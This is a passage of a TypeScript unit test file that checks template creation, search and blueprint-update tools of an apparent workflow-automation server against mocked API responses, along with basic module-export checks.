          complexity: 'complex' as const,
          estimatedSetupTime: 90,
          requiredConnections: ['app0', 'app1', 'app2', 'app3', 'app4', 'app5', 'app6', 'app7']
        }
      };

      mockApiClient.mockResponse('POST', '/templates', {
        success: true,
        data: complexTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      const result = await executeTool(tool, {
        name: 'Complex Enterprise Template',
        blueprint: complexBlueprint
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template.metadata.complexity).toBe('complex');
      expect(parsedResult.analysis.complexity).toBe('complex');
      expect(parsedResult.analysis.requiredConnections).toHaveLength(8);
    });

    it('should handle template search with comprehensive filters', async () => {
      const searchResults = [
        testTemplate,
        { ...testTemplate, id: 2004, name: 'Alternative Template', tags: ['alternative'] }
      ];

      mockApiClient.mockResponse('GET', '/templates', {
        success: true,
        data: searchResults,
        metadata: { total: 2 }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-templates');
      const result = await executeTool(tool, {
        searchQuery: 'onboarding',
        hasConnections: ['email', 'crm'],
        minUsage: 10,
        includeUsage: true,
        sortBy: 'usage',
        sortOrder: 'desc'
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.templates).toHaveLength(2);
      expect(parsedResult.summary.popularTags).toBeDefined();
      expect(parsedResult.summary.mostUsedTemplates).toBeDefined();
    });

    it('should handle template blueprint updates with complexity recalculation', async () => {
      const updatedBlueprint = {
        modules: [
          ...testTemplate.blueprint.modules,
          {
            id: 4,
            app: 'database',
            operation: 'insert',
            metadata: { table: 'audit_log', connectionId: 4003 }
          }
        ],
        routes: [
          ...testTemplate.blueprint.routes,
          { from: 3, to: 4 }
        ]
      };

      const updatedTemplate = {
        ...testTemplate,
        blueprint: updatedBlueprint,
        version: 2,
        metadata: {
          ...testTemplate.metadata,
          complexity: 'moderate' as const,
          estimatedSetupTime: 25,
          requiredConnections: ['email', 'crm', 'database']
        }
      };

      mockApiClient.mockResponse('PUT', '/templates/2001', {
        success: true,
        data: updatedTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        blueprint: updatedBlueprint
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template.metadata.complexity).toBe('moderate');
      expect(parsedResult.template.metadata.requiredConnections).toContain('database');
    });
  });

  describe('Module Structure', () => {
    it('should import without errors', async () => {
      // This test verifies the module can be imported without syntax errors
      await expect(import('../../../src/tools/templates.js')).resolves.toBeDefined();
    });

    it('should have proper TypeScript compilation', async () => {
      const templatesModule = await import('../../../src/tools/templates.js');
      
      // Basic structural validation
      expect(templatesModule).toBeDefined();
      expect(typeof templatesModule).toBe('object');
    });

    it('should export helper functions correctly', async () => {
      const templatesModule = await import('../../../src/tools/templates.js');
      
      // While helper functions are not exported, we verify the module structure
      expect(templatesModule.addTemplateTools).toBeDefined();
      expect(templatesModule.default).toBeDefined();
      expect(templatesModule.addTemplateTools).toBe(templatesModule.default);
    });
  });
});